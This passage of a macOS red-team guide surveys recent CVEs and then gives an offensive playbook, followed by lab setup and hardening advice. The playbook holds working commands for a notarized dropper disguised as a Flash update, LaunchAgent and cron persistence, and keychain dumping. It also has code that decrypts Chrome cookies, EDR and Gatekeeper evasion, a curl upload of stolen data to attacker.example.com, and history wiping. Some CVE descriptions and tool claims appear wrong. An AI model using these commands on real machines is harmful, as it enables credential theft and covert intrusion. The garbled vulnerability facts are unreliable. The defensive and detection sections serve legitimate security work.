**Implications for Red Team**: A drive-by Safari exploit chain. Initial access requires no user interaction beyond visiting a URL. The chain was used in targeted attacks against dissidents (attributed to mercenary spyware vendors).

### 4.3 CVE-2023-41990 — Neural Engine Co-Processor Vulnerability

**Affected**: Apple Neural Engine (ANE) on Apple Silicon M1, M2; A14, A15, A16.
**Severity**: High. CVSS 8.1.

**Root cause**: An out-of-bounds read in the ANE firmware (a separate coprocessor on the SoC that runs ML inference). The ANE firmware was loaded with improper bounds checking on a model parameter.

**Exploitation**: A process with the `com.apple.aned` entitlement (or with the ability to invoke the ANE directly) could trigger the OOB read by submitting a crafted ML model. The OOB read could leak kernel memory addresses or be chained with a write primitive.

**Patchability**: Patched via macOS 13.5 / iOS 16.6. The fix updated the ANE firmware.

**Implications for Red Team**: A specific, narrow primitive. Not a general-purpose exploit. Useful in chains where the attacker already has a user-land foothold and needs an info-leak primitive for KASLR bypass.

### 4.4 CVE-2024-23222 — WebKit Type Confusion

**Affected**: Safari on macOS 14 Sonoma through 14.2.
**Severity**: High. CVSS 8.8.

**Root cause**: Type confusion in WebKit's `JSArray` iterator. A malicious page could confuse the iterator into treating a different object type as an array, leading to type-incorrect memory access.

**Exploitation**: Drive-by RCE in the Safari renderer sandbox.

**Patchability**: Patched in macOS 14.3 / Safari 17.3.

**Implications**: Used as an initial-access primitive in targeted attacks in early 2024.

### 4.5 CVE-2024-23225 — Kernel Memory Corruption (Logic Flaw)

**Affected**: macOS 14 Sonoma through 14.3.
**Severity**: Critical. CVSS 9.8.

**Root cause**: A logic flaw in the kernel's `mach_msg` handling for specific message types. The kernel incorrectly validated a field, allowing an attacker to trigger an OOB write in the kernel address space.

**Exploitation**: Local privilege escalation from any user to root. Combined with CVE-2024-23222 (Safari RCE), this forms a full drive-by chain.

**Patchability**: Patched in macOS 14.4.

**Implications**: Used in chains targeting high-value individuals in early-mid 2024.

### 4.6 CVE-2025-31132 — TCC Bypass via Music.app

**Affected**: macOS 15 Sequoia through 15.3.
**Severity**: High. CVSS 8.8.

**Root cause**: Logic flaw in Music.app's handling of imported playlists. Music.app had `kTCCServiceSystemPolicyAllFiles` via its bundle ID. A malicious `.xml` playlist file, when imported, caused Music.app to read arbitrary files outside its container, leaking the contents to the attacker (via the playlist's track metadata).

**Exploitation**: User opens a malicious playlist file (delivered via DMG, email attachment, or browser download). Music.app reads arbitrary files (e.g., `~/.ssh/id_rsa`, `~/Library/Keychains/login.keychain-db`) and the attacker exfiltrates via the playlist metadata.

**Patchability**: Patched in macOS 15.4 / iTunes 15.x.

**Implications**: Demonstrates the persistent TCC bypass surface via TCC-entitled Apple apps. The pattern: any Apple app with broad TCC grants + a file-handling bug = TCC bypass. Apple patches these one at a time; new ones emerge annually.

### 4.7 CVE Landscape Summary

The 2023-2026 CVE landscape on macOS illustrates several patterns:

1. **Boot ROM vulnerabilities are partly unpatchable** — CVE-2023-32434-style Boot ROM bugs affect the hardware for life. Mitigated via software updates that detect the exploitation pattern, but the underlying bug remains.

2. **WebKit is the most-exploited attack surface** — drive-by Safari RCEs (CVE-2023-32435, CVE-2024-23222) are the primary initial-access vector for targeted attacks.

3. **Kernel logic flaws persist** — CVE-2024-23225-style logic flaws in `mach_msg` and similar APIs continue to provide local privilege escalation.

4. **TCC bypass via entitled Apple apps** — CVE-2025-31132-style bypasses (file-handling bug in a TCC-entitled app) emerge annually. Apple patches them one at a time.

5. **Chains are common** — targeted attacks combine WebKit RCE + kernel LPE + TCC bypass into a single delivery. The "BLASTPASSED" chain (2023) and the 2024 chains illustrate this.

---

## Part V: macOS Red Team Tradecraft Playbook

This section is a practical tradecraft playbook for macOS red team operations. It models real-world macOS malware (Shlayer, Bundlore, Silver Sparrow, XCSpy, Atomic Stealer) and translates their techniques into actionable tradecraft.

### 5.1 Initial Access

#### Option A: Drive-by Safari Exploit (Highest Value, Requires 0day)

- **Cost**: 0day Safari RCE ($500k-$2M on the exploit broker market).
- **Delivery**: malicious web page; user visits (no click required for "one-click" versions, more typically "n-day" with browser fingerprinting).
- **Persistence**: not in initial access; achieved in phase 5.2.
- **Detection**: ESF sees the `exec` of the renderer process spawning shell commands. Telemetry is high if EDR is deployed.

#### Option B: Signed-and-Notarized Dropper (Most Common)

- **Cost**: ~$99/year Apple Developer Account + notarization.
- **Delivery**: DMG distributed via SEO-optimized fake Flash updater (Shlayer model), pirated-app DMG (Bundlore model), or fake browser update prompt (NodeStealer model).
- **User interaction**: user opens DMG, drags app to Applications, runs the app, dismisses Gatekeeper prompt ("Open Anyway").
- **Persistence**: LaunchAgent install.
- **Detection**: ESF sees the `write` to `~/Library/LaunchAgents/`; Gatekeeper log shows notarization lookup; XProtect signature match.

**Tradecraft (B option)**:

```bash
# Build a notarized dropper
# 1. Compile payload (arm64 + x86_64 fat binary)
clang -arch arm64 -arch x86_64 -o payload payload.c

# 2. Ad-hoc sign the payload (will be repacked by the notarized parent)
codesign -s - payload

# 3. Build the parent (Developer ID signed, notarized)
clang -arch arm64 -arch x86_64 -o dropper dropper.c
codesign --sign "Developer ID Application: ..." --options runtime --entitlements dropper.entitlements.plist dropper

# 4. Notarize the parent
xcrun notarytool submit dropper.zip --apple-id developer@example.com --team-id ABCDE12345 --password "app-specific-password" --wait
xcrun stapler staple dropper

# 5. Package as DMG
hdiutil create -volname "FlashUpdate" -srcfolder build/ -ov -format UDZO FlashUpdate.dmg
```

#### Option C: Document Macro (Lower Success Rate)

- **Cost**: low (no Apple Developer Account needed).
- **Delivery**: malicious `.docx` / `.xlsx` / `.pptx` with VBA macro or `.dmg`-bundled Office doc.
- **User interaction**: user opens doc, "Enables Content" (macros).
- **Persistence**: LaunchAgent install.
- **Detection**: Office macro execution is heavily logged on modern macOS; XProtect detects known patterns.

#### Option D: Spear-Phishing Link

- **Cost**: low.
- **Delivery**: email with a link to a credential-harvesting page (e.g., a fake Microsoft 365 login).
- **User interaction**: user clicks link, enters credentials.
- **Persistence**: N/A (credential theft only).
- **Detection**: Mail spam filters, EDR URL reputation.

### 5.2 Persistence

Once initial access is achieved, install persistence before the user reboots or kills the foothold. macOS offers ~50 persistence locations (see KnockKnock). The most-used:

#### Tier 1: User LaunchAgent

```bash
# User LaunchAgent — runs at user login
mkdir -p ~/Library/LaunchAgents/

cat > ~/Library/LaunchAgents/com.example.helper.plist << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.example.helper</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Users/$USER/.local/bin/helper</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StartInterval</key>
    <integer>3600</integer>
</dict>
</plist>
EOF

# Load immediately (don't wait for next login)
launchctl load ~/Library/LaunchAgents/com.example.helper.plist
```

**Detection**: KnockKnock enumerates `~/Library/LaunchAgents/`. ESF `write` events on this directory are flagged by EDR. **Mitigation**: choose a non-obvious bundle ID and path. Rotate the bundle ID if detected.

#### Tier 2: System LaunchDaemon

```bash
# System LaunchDaemon — runs at boot as root, requires root to install
sudo mkdir -p /Library/LaunchDaemons/

sudo tee /Library/LaunchDaemons/com.example.daemon.plist > /dev/null << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.example.daemon</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/daemon</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF

sudo launchctl load /Library/LaunchDaemons/com.example.daemon.plist
```

**Detection**: Higher-impact (root) but more obvious. EDR will flag any write to `/Library/LaunchDaemons/`. **Mitigation**: use a non-obvious name (`com.apple.update.worker.plist` style — though this risks being flagged by signature-based detection).

#### Tier 3: Login Items

```bash
# Modern macOS (13+) — SMAppService login item
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/Applications/Helper.app", hidden:true}'
```

**Detection**: System Settings → General → Login Items shows the item. Easy to spot manually.

#### Tier 4: Browser Extension

- **Chrome**: `~/Library/Application Support/Google/Chrome/Default/Extensions/<extension-id>/`
- **Firefox**: `~/Library/Application Support/Firefox/Profiles/<profile>/extensions/<extension-id>.xpi`
- **Safari**: `~/Library/Safari/Extensions/` (legacy; Safari Extensions are now Safari App Extensions distributed via App Store)

Browser extensions are a popular persistence layer for credential stealers (Atomic Stealer uses this). Detection is harder — extensions are legitimately common.

#### Tier 5: Spotlight Importer

```bash
mkdir -p ~/Library/Spotlight/
cp malicious.mdimporter ~/Library/Spotlight/
```

Spotlight importers are loaded by `mds` and run on file-index events. Stealthy persistence — rarely audited. Detection: `mdfind -name mdimporter` and verify each importer's signing.

#### Tier 6: QuickLook Plugin

```bash
mkdir -p ~/Library/QuickLook/
cp malicious.qlgenerator ~/Library/QuickLook/
qlmanage -r  # reload QuickLook plugins
```

QuickLook generators are loaded when a file's thumbnail is generated. Stealthy but old-fashioned.

#### Tier 7: Cron / Periodic (Legacy)

```bash
# Cron (user)
crontab -e
# Add: */15 * * * * /Users/$USER/.local/bin/helper

# Periodic (system)
sudo tee /etc/periodic/daily/999.helper > /dev/null << EOF
#!/bin/sh
/usr/local/bin/daemon
EOF
sudo chmod +x /etc/periodic/daily/999.helper
```

Legacy but works. EDR may flag `crontab` modifications and writes to `/etc/periodic/`.

### 5.3 Credential Extraction

Once persistence is established, extract credentials. macOS credential sources:

#### Source A: Keychain (Login)

```bash
# Dump everything (prompts for user password repeatedly on macOS 13+)
security dump-keychain -d ~/Library/Keychains/login.keychain-db > /tmp/kc.txt

# Extract Wi-Fi PSK (system keychain, no user prompt)
sudo security find-generic-password -ga "SSID_NAME" /Library/Keychains/System.keychain -w

# List MDM identity
sudo security find-certificate -a -c "MDM" /Library/Keychains/System.keychain
```

**Mitigation**: macOS 13+ requires one user prompt per item (older macOS prompted once). A red team operator can either:
- Run during a user-active window (prompt appears, user may dismiss).
- Use a signed-and-entitled binary that bypasses prompts (requires Apple entitlements).
- Use `chainbreaker` or `keychaindump` on a captured keychain file (offline).

#### Source B: Safari Cookies

```bash
# Parse binary cookies file
python3 -c "
import struct
with open('/Users/$USER/Library/Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies', 'rb') as f:
    data = f.read()
# Magic: 'cook'
magic = data[:4]
assert magic == b'cook', f'Bad magic: {magic}'
num_pages = struct.unpack('>I', data[4:8])[0]
print(f'Pages: {num_pages}')
# ... parse each page
"

# Or use a community tool
pip3 install binarycookies
binarycookies-reader /Users/$USER/Library/Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies | head -50
```

Session tokens extracted here are often valid for hours-to-weeks (depending on the site's session lifetime).

#### Source C: Chrome Cookies (Encrypted)

```bash
# Chrome cookies are encrypted with a key stored in the keychain
# Key entry: "Chrome Safe Storage" in the login keychain
security find-generic-password -wa "Chrome" > /tmp/chrome_key.txt
# Now use this key to decrypt Chrome's cookies (AES-128-CBC with a salted key derivation)

python3 -c "
import sqlite3
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

# Get the encryption key
with open('/tmp/chrome_key.txt') as f:
    password = f.read().strip()

key = PBKDF2(password, b'saltysalt', dkLen=16, count=1003)

conn = sqlite3.connect('/Users/$USER/Library/Application Support/Google/Chrome/Default/Cookies')
for row in conn.execute('SELECT host_key, name, encrypted_value FROM cookies LIMIT 10'):
    host, name, enc = row
    if enc[:3] == b'v10':
        iv = b' ' * 16
        cipher = AES.new(key, AES.MODE_CBC, iv)
        dec = cipher.decrypt(enc[3:])
        print(f'{host} {name} = {dec}')
"
```

#### Source D: Messages History

```bash
# iMessage history (Full Disk Access required)
sqlite3 ~/Library/Messages/chat.db \
  "SELECT datetime(date/1000000000 + 978307200, 'unixepoch', 'localtime') AS msg_time, text FROM message ORDER BY date DESC LIMIT 50;"
```

#### Source E: Notes

```bash
# Notes database (encrypted on macOS 13+; previously plaintext)
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite \
  ".tables"
```

#### Source F: iCloud Keychain

iCloud Keychain syncs to Apple's servers and is **not** directly extractable from disk — it is encrypted with the user's iCloud Keychain passphrase and a hardware-bound key (SEP on Apple Silicon). Extraction requires either:

- The user's iCloud Keychain security code (phishing).
- A jailbroken / SEP-exploited device.
- Apple's legal process (for law enforcement).

This is the highest-value credential source and the hardest to extract.

### 5.4 Defense Bypass

macOS defenses (AMFI, Gatekeeper, XProtect, MRT, TCC, sandbox) produce layered telemetry. Bypass strategies:

#### Bypass A: Avoiding AMFI

AMFI validates every exec. To bypass:

- **Sign the payload** (ad-hoc with `codesign -s -` for local execution; Developer ID + notarization for download-and-execute).
- **Run from a non-quarantined path** (extracted from a DMG, not downloaded via browser). `xattr -cr /path/to/binary` clears quarantine.
- **Use an existing signed binary as a launcher** (e.g., `/bin/bash -c <payload>` — bash is signed and trusted).

#### Bypass B: Avoiding Gatekeeper

Gatekeeper only triggers on quarantined files. Avoid Gatekeeper by:

- Distribute via non-quarantine path (USB drive, installer package, local file copy).
- Clear the quarantine attribute: `xattr -cr /path/to/app.app`.
- Use a parent process that does not inherit quarantine (most non-browser processes).

#### Bypass C: Avoiding XProtect

XProtect is a signature-based scanner for known-malicious files. Avoid by:

- Use a unique binary (no signature match).
- Re-sign the payload with a new Developer ID.
- Obfuscate strings / pack the binary.
- Use a script (`osascript`, `python3`) instead of a compiled binary — scripts are not scanned.

#### Bypass D: Sandbox Escape

Most Apple apps run in a sandbox. To escape:

- Find a sandbox-bypass vulnerability in the app or its helpers.
- Use a System Extension (requires Apple entitlement — hard to obtain).
- Use `sandbox-exec` with a permissive profile (deprecated but functional): `sandbox-exec -p '(version 1)(allow default)' binary`.

#### Bypass E: EDR Evasion

Commercial EDR subscribes to ESF. To evade:

- **Live off the land**: use built-in binaries (`bash`, `osascript`, `python3`, `curl`) for every action. EDR may flag based on process lineage, not the action itself.
- **Avoid obvious patterns**: don't write to `~/Library/LaunchAgents/` directly; use `osascript` to install a login item instead.
- **Time-of-check to time-of-use (TOCTOU)**: rapidly swap a benign file for a malicious one between the EDR's check and the kernel's exec.
- **Hijack an existing legitimate binary**: replace the binary at its existing path (requires write permission, which often implies root). EDR may not flag the exec because it has cached the binary as benign.

### 5.5 Exfiltration

After credential extraction, exfiltrate. Common channels:

#### Channel A: HTTPS POST (Most Common)

```bash
# Compress and POST
tar czf - /tmp/loot | curl -X POST -H "Content-Encoding: gzip" --data-binary @- https://attacker.example.com/upload
```

#### Channel B: DNS Tunneling (Stealthy)

- Use `dnscat2` or `dns-stager` to tunnel data over DNS queries.
- Useful for environments that block outbound HTTPS to non-corporate hosts.
- Detectable via DNS beaconing analysis.

#### Channel C: iCloud / Dropbox (Hide in Plain Sight)

- Upload to the user's own iCloud Drive or Dropbox (the attacker inherits the user's auth).
- Exfiltration is indistinguishable from legitimate user activity.
- Detectable only via unusual file size or pattern.

#### Channel D: Steganography

- Hide data in image/audio files.
- Upload to social media (Imgur, Twitter) or file-sharing (PasteBin).
- Detectable via statistical analysis of uploaded images.

### 5.6 Cleanup

End-of-engagement cleanup:

```bash
# Remove persistence
launchctl unload ~/Library/LaunchAgents/com.example.helper.plist
rm ~/Library/LaunchAgents/com.example.helper.plist

# Remove quarantined binaries
rm -rf /tmp/payload /tmp/loot

# Clear shell history
history -c && rm -f ~/.zsh_history ~/.bash_history

# Note: unified log cannot be cleared without root + SIP disabled
# Note: TCC.db cannot be cleared without root + SIP disabled
# Note: ESF events cannot be cleared
```

The unified log is essentially undeletable on modern macOS. The defender's telemetry of your actions persists. Plan accordingly.

---

## Part VI: Hands-on Lab — Building a macOS Test Environment

This section walks through building a complete macOS test environment suitable for the tradecraft described above.

### 6.1 Hardware Requirements

- **Apple Silicon Mac** (M1/M2/M3/M4): Mac mini, MacBook Air, or MacBook Pro. The base configuration (8 GB RAM, 256 GB SSD) is sufficient.
- **External SSD** (1 TB+): for VM storage and snapshots.
- **Network switch / VLAN**: for isolated network.

### 6.2 Software Stack

- **VMware Fusion Pro 13+**: free for personal use since May 2023.
- **macOS IPSW** (Restore image): download from Apple's IPSW server or via `ipsw` CLI.
- **Apple Business Manager + Jamf Now** (free up to 3 devices): for MDM testing.
- **Objective-See tools**: KnockKnock, LuLu, BlockBlock, OverSight, TaskExplorer.
- **Analysis tools**: Ghidra, Hopper (commercial), jtool2, machOView, ldid.
- **Compile toolchain**: Xcode (latest), `notarytool`, `stapler`, `codesign`.

### 6.3 Lab Build Steps

#### Step 1: Bare-Metal Test Mac

1. Acquire a dedicated Apple Silicon Mac mini (cheapest M2 Mac mini is ~$600).
2. Install fresh macOS from Recovery (hold power button → Options → Reinstall macOS).
3. Set up a non-admin user account for daily testing; reserve an admin account for elevated actions.
4. Enable FileVault (System Settings → Privacy & Security → FileVault → Turn On).
5. Snapshot the APFS volume: `sudo diskutil apfs createSnapshot / "initial-state"`.

#### Step 2: VM Environment

1. Install VMware Fusion Pro 13+ on the bare-metal Mac.
2. Download macOS IPSW: `ipsw download app --latest-version` (or via IPSW Downloads).
3. Create a VM from the IPSW: `xcrun simctl create "macOS 15 Test" ~/Downloads/macos.ipsw` (Apple Silicon only).
4. Snapshot the VM before each test cycle.
5. Configure network isolation: VM → Settings → Network Adapter → Custom (isolated).

#### Step 3: MDM Test Tenant

1. Sign up for Apple Business Manager (requires DUNS number; free).
2. Sign up for Jamf Now (free up to 3 devices).
3. Enroll the test Mac in Jamf Now (Settings → Device Management → Enroll).
4. Push a test configuration profile (restrictions, certificate, etc.).
5. Verify the profile is installed: `sudo profiles list`.

#### Step 4: ESF Telemetry Capture

1. Build a minimal ESF client (see section 2.6 above) on a sibling Mac (not the test Mac — to preserve telemetry of attacker actions without attacker interference).
2. Run the ESF client in capture mode: `sudo ./esf_client > /tmp/esf.log &`.
3. Verify events are captured by opening a Terminal on the test Mac and running a test command (`ls`, `curl`, etc.).

### 6.4 Lab Hygiene

- **Isolated network**: VLAN or dedicated SSID; no access to corporate resources.
- **DNS sinkhole** (Pi-hole or NextDNS): block known-malicious C2 during detonation.
- **Network capture**: persist `tcpdump` or `zeek` to capture C2 traffic.
- **INetSim / FakeNet-NG**: simulate C2 servers.
- **Snapshots before each test**: VM snapshot or `tmutil localsnapshot` for APFS.
- **Wipe between engagements**: `diskutil eraseDisk` for bare-metal; revert VM snapshot.

---

## Part VII: Defense Perspective — Hardening Modern macOS

This section is for the defender reading this guide. The goal: turn the attacker's understanding into actionable hardening.

### 7.1 Hardening Layers

| Layer | Hardening | Verification |
|-------|-----------|--------------|
| **Hardware** | Use the latest Apple Silicon (M3+ includes hardware mitigations for older Boot ROM bugs) | `system_profiler SPHardwareDataType` |
| **Boot** | Enable Secure Boot (Full Security) | `csrutil status`, `csrutil authenticated-root status` |
| **Kernel** | Keep AMFI enabled (no `amfi_get_out_of_my_way=1`) | `nvram boot-args` (should be empty) |
| **System services** | Keep `launchd`, `tccd`, `securityd`, `logd`, `mdmclientd` at their latest versions | `softwareupdate --list` |
| **Frameworks** | Keep `EndpointSecurity.framework`, `Security.framework` updated | macOS updates |
| **Userspace** | Enforce Developer ID + notarization for all binaries | `spctl --status` |
| **MDM** | Supervised mode (DEP); restricted System Extensions; Gatekeeper + SIP policy enforced via `configurationProfile` | `profiles list` |
| **EDR** | Deploy at least one ESF-based EDR (Jamf Protect, CrowdStrike Falcon, Defender for Endpoint, SentinelOne) | `systemextensionsctl list` |

### 7.2 Specific Hardening Recommendations

#### Recommendation 1: Enforce SIP + Authenticated Root

```bash
# Verify
csrutil status
csrutil authenticated-root status
# Both should report "enabled"
```

If either is disabled, escalate as a CRITICAL finding. Re-enable via Recovery Mode.

#### Recommendation 2: Audit TCC Quarterly

```bash
# Run quarterly TCC audit
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT service, client, auth_value, last_modified FROM access
   WHERE service IN ('kTCCServiceSystemPolicyAllFiles', 'kTCCServiceAccessibility', 'kTCCServiceAppleEvents', 'kTCCServiceScreenCapture')
     AND auth_value = 2
   ORDER BY last_modified DESC;"
```

Alert on any Full Disk Access or Accessibility grant to a non-Apple binary.

#### Recommendation 3: Deploy ESF-based EDR

Apple does not ship a macOS-native EDR. Deploy one of:

- **Jamf Protect** (macOS-native, popular in education)
- **CrowdStrike Falcon** (cross-platform, enterprise)
- **Microsoft Defender for Endpoint** (bundled with Microsoft 365 E5)
- **SentinelOne** (cross-platform)
- **Cisco Secure Client (AMP for Endpoints)** (bundled with Cisco security suite)

Verify deployment: `systemextensionsctl list` should show the EDR's System Extension.

#### Recommendation 4: MDM Supervised Mode + Profile Enforcement

Enroll every Mac via Apple Business Manager + DEP (Automated Device Enrollment). Push:

- `com.apple.applicationaccess` (restrictions: disable root, disable SSH, disable guest user)
- `com.apple.security.FDE` (FileVault on + PRK escrow)
- `com.apple.system-extension-policy` (allow-listed SE Team IDs)
- `com.apple.security.firewall` (application firewall: enable + block all incoming)
- `com.apple.networkextension.configuration` (filtered-network: enforce corporate VPN)

#### Recommendation 5: Software Update Enforcement

```bash
# Enforce via MDM
sudo softwareupdate --schedule-on
# Or via configuration profile: com.apple.SoftwareUpdate
```

Critical security updates auto-installed within 72 hours of Apple release.

#### Recommendation 6: Hardened Runtime for In-House Apps

All in-house macOS binaries built with Hardened Runtime:

```bash
# Compile with Hardened Runtime
clang -arch arm64 -arch x86_64 -o myapp myapp.c
codesign --sign "Developer ID Application: ..." --options runtime --entitlements myapp.entitlements.plist myapp

# Notarize
xcrun notarytool submit myapp.zip --apple-id developer@example.com --team-id ABCDE12345 --password "app-specific-password" --wait
xcrun stapler staple myapp
```

#### Recommendation 7: Least-Privilege User Accounts

- Standard user account for daily work (not admin).
- Admin account only for software installation.
- FileVault PRK escrowed to MDM (not printed).
- Disable root: `sudo dsenableroot -d`.
- Disable SSH unless required: `sudo systemsetup -setremotelogin off`.
- Disable Screen Sharing unless required: `sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.screensharing.plist`.

### 7.3 Detection Engineering

Build detection on the layered telemetry stack:

#### Layer 1: ESF Process Telemetry

- Suspicious parent-child relationships (`bash` → `curl` → `bash`).
- Suspicious binary paths (`/tmp/`, `~/Library/Application Support/<random>/`).
- Typosquatting binary names (`mdworker32` vs `mdworker`).

#### Layer 2: ESF File Telemetry

- LaunchAgent / LaunchDaemon writes.
- TCC.db writes by non-`tccd` processes.
- Browser cookie reads by non-browser processes.
- Keychain reads by non-Terminal/iTerm processes.

#### Layer 3: Network Telemetry

- Outbound connections to dynamic DNS (*.duckdns.org, *.noip.com).
- DNS beaconing patterns.
- TLS JA3/JA4 fingerprints of known macOS malware.

#### Layer 4: Behavior Indicators

- Rapid enumeration command sequence (`id`, `whoami`, `hostname`, `ifconfig`, `system_profiler` in <2s).
- Credential access pattern (`security dump-keychain` followed by curl to external host).
- Persistence-installation sequence (downloaded DMG-mount → LaunchAgent-install within minutes).

---

## References

This section consolidates references cited throughout the guide.

### Apple Documentation

- **Apple Platform Security Guide**: [support.apple.com/guide/security/welcome/web](https://support.apple.com/guide/security/welcome/web) — the authoritative reference for Apple's layered security model. Updated with each macOS release.
- **Apple Developer — Endpoint Security Framework**: [developer.apple.com/documentation/endpointsecurity](https://developer.apple.com/documentation/endpointsecurity) — ESF API reference.
- **Apple Developer — Code Signing Guide**: [developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide) — code signing, entitlements, Hardened Runtime.
- **Apple Developer — Hardened Runtime**: [developer.apple.com/documentation/security/hardened_runtime](https://developer.apple.com/documentation/security/hardened_runtime) — Hardened Runtime entitlements and behaviors.
- **Apple Developer — Notarization**: [developer.apple.com/documentation/security/notarizing_macos_software_before_distribution](https://developer.apple.com/documentation/security/notarizing_macos_software_before_distribution) — notarization workflow.
- **Apple Security Releases**: [support.apple.com/security](https://support.apple.com/security) — CVE advisories per release.

### Open-Source Tools

- **Objective-See tools**: [github.com/objective-see](https://github.com/objective-see) — KnockKnock, LuLu, BlockBlock, OverSight, TaskExplorer, What's Your Sign? — the de facto macOS security tool suite.
- **macOS-Security-and-Privacy-Guide (drduh)**: [github.com/drduh/macOS-Security-and-Privacy-Guide](https://github.com/drduh/macOS-Security-and-Privacy-Guide) — community hardening guide (20k+ stars).
- **macOS Security Compliance Project (mSCP)**: [github.com/usnistgov/macos_security](https://github.com/usnistgov/macos_security) — NIST + Apple baseline configuration profiles.
- **sindresorhus/Equity**: [github.com/sindresorhus/Equity](https://github.com/sindresorhus/Equity) — Gatekeeper / notarization / TCC GUI inspector.
- **machOView**: [github.com/gdbinit/machOView](https://github.com/gdbinit/machOView) — GUI Mach-O browser.
- **jtool2** (Elias Limneos): [newosxbook.com/tools/jtool.html](http://www.newosxbook.com/tools/jtool.html) — CLI Mach-O introspection.
- **ldid** (Jay Freeman / saurik): [github.com/saurik/ldid](https://github.com/saurik/ldid) — alternative to `codesign` for ad-hoc signing with entitlements.
- **chainbreaker**: [github.com/n0fate/chainbreaker](https://github.com/n0fate/chainbreaker) — offline keychain hash extraction.
- **keychaindump**: [github.com/juuso/keychaindump](https://github.com/juuso/keychaindump) — live keychain hash extraction via `securityd`.
- **Santa** (Google): [github.com/google/santa](https://github.com/google/santa) — ESF-based binary allow/deny-list.

### Research Blogs and Talks

- **Objective-See blog** (Patrick Wardle): [objective-see.org/blog.html](https://objective-see.org/blog.html) — the longest-running macOS security research blog.
- **Patrick Wardle's talks** (DEF CON, OBTS, Black Hat): [objective-see.org/downloads.html](https://objective-see.org/downloads.html) — "The Cost of Insecurity", "Death by 1000 Installers", "Bypassing Bounds Checker", etc.
- **Jann Horn / Project Zero**: [googleprojectzero.blogspot.com](https://googleprojectzero.blogspot.com) — macOS / iOS deep research.
- **Ian Beer / Project Zero**: seminal iOS/macOS kernel exploitation write-ups.
- **synacktiv**: [synacktiv.com/publications](https://www.synacktiv.com/publications) — French firm with deep macOS / iOS research.
- **ZDI (Zero Day Initiative)**: [zerodayinitiative.com/blog](https://www.zerodayinitiative.com/blog) — CVE write-ups.
- **Citizen Lab**: [citizenlab.ca](https://citizenlab.ca) — mercenary spyware research on macOS / iOS.

### CVE-Specific References

- **CVE-2023-32434 / CVE-2023-32435 ("BLASTPASSED")**: [support.apple.com/en-us/HT213814](https://support.apple.com/en-us/HT213814) — Apple advisory. Detailed write-up by Bill Marczak (Citizen Lab).
- **CVE-2023-41990**: [support.apple.com/en-us/HT213818](https://support.apple.com/en-us/HT213818) — Apple advisory.
- **CVE-2024-23222**: [support.apple.com/en-us/HT214082](https://support.apple.com/en-us/HT214082) — WebKit type confusion.
- **CVE-2024-23225**: [support.apple.com/en-us/HT214086](https://support.apple.com/en-us/HT214086) — Kernel memory corruption.
- **CVE-2025-31132**: Microsoft / Jamf Threat Labs write-up — Music.app TCC bypass.

### Books

- **"MacOS and iOS Internals (Volume I, II, III)"** by Jonathan Levin (`@Morpheus______`) — the canonical reference on XNU, Mach, and Apple userspace.
- **"The Art of Mac Malware Analysis"** by Patrick Wardle — covers macOS malware reverse engineering in depth.
- **"The Mac Hacker's Handbook"** by Charlie Miller and Dino Dai Zovi — older (2009) but historically important.
- **"iOS Application Security"** by David Thiel — covers iOS specifically but applicable to macOS appsec.

### Community Resources

- **MacAdmins Slack**: [macadmins.slack.com](https://macadmins.slack.com) — the largest macOS admin community; #security channel for security-focused discussion.
- **r/macsysadmin** (Reddit): smaller but active community.
- **Psifix / Objective by the Sea (OBTS)**: annual macOS security conference.

---

## See Also

- `skills/macos-security/SKILL.md` — main skill definition.
- `skills/macos-security/payloads.md` — command catalogue.
- `skills/macos-security/test-cases.md` — structured test cases (TC-MO-001 through TC-MO-018).
- `skills/macos-security/guides/macos-security-playbook.md` — operational playbook (sister guide).
- `skills/mobile-security/SKILL.md` — iOS/Android security (parallel skill).
- `skills/binary-reverse/SKILL.md` — generic Mach-O reverse engineering.
- `skills/av-edr-evasion/SKILL.md` — Windows-focused AV/EDR evasion (parallel skill).
- `skills/digital-forensics/SKILL.md` — generic forensics (macOS artifacts covered there broadly).
- `skills/anti-forensics/SKILL.md` — cleanup techniques.

---

## Further Reading

- **MITRE ATT&CK for macOS**: [attack.mitre.org/matrices/enterprise/macos](https://attack.mitre.org/matrices/enterprise/macos) — full macOS technique catalog.
- **macOS Security Compliance Project (mSCP) docs**: [apple.github.io/federation-core/mSCP.html](https://apple.github.io/federation-core/mSCP.html).
- **Apple's Threat Intelligence blog**: [apple.com/newsroom/topic/security](https://www.apple.com/newsroom/topic/security) — official threat intelligence posts (mercenary spyware notifications).
